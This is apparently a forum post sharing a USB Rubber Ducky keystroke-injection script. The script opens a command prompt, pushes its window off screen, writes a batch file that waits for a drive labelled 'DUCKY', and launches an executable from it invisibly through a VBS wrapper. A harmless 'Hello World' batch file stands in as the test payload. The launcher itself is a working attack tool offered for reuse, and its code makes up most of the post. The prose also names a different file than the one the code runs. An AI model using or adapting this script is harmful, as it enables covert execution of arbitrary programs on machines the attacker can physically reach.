The following is a payload I have been working on that waits until a drive labeled "DUCKY" is mounted. I have used some of midnightsnake's code in this payload. The name of the file that is run can be changed to .exe, I am just having it run a batch for testing purposes. The line that says "STRING START %myd%\myEXE.bat" is the line that executes the executable.

```
REM Author: overwraith
REM Name: RunEXE.txt
REM Purpose: Run an executable file off of the SD card after it mounts. 
REM Encoder V2.4
REM Using the run command for a broader OS base. 
DEFAULT_DELAY 25
DELAY 3000
GUI R
DELAY 1000
STRING cmd /Q /D /T:7F /F:OFF /V:ON /K
DELAY 500
ENTER
DELAY 750
ALT SPACE
STRING M
DOWNARROW
REPEAT 100
ENTER

REM Make batch file that waits for SD card to mount. 
REM Delete batch file if already exists
STRING erase /Q DuckyWait.bat
ENTER
STRING copy con DuckyWait.bat
ENTER
REM DuckyWait.bat
STRING :while1
ENTER
STRING for /f %%d in ('wmic volume get driveletter^, label ^| findstr "DUCKY"') 

do set myd=%%d
ENTER
STRING if Exist %myd% (
ENTER
STRING goto break
ENTER
STRING )
ENTER
STRING timeout /t 30
ENTER
STRING goto while1
ENTER
STRING :break
ENTER
REM Continue script.
STRING START %myd%\HelloWorld.exe
ENTER
CONTROL z
ENTER

REM MAKE THE VBS FILE THAT ALLOWS RUNNING INVISIBLY.
REM Delete vbs file if already exists
STRING erase /Q invis.vbs
ENTER
REM FROM: http://stackoverflow.com/questions/289498/running-batch-file-in-

background-when-windows-boots-up
STRING copy con invis.vbs
ENTER
STRING CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, 

False
ENTER
CONTROL Z
ENTER

REM RUN THE BATCH FILE
STRING wscript.exe invis.vbs DuckyWait.bat
ENTER
STRING EXIT
ENTER
```

The following is the batch file that is run after the "DUCKY" drive has been mounted. Everything is being run invisibly, so you will need to check for the existence of "Message.txt" which will probably be in "C:\Windows\system32".

```
REM Message.txt
echo Hello Wolrd!!!
echo Hello World!!! > Message.txt
```

The encoders now support the repeat command, so should only be a problem if you are using an old encoder. 

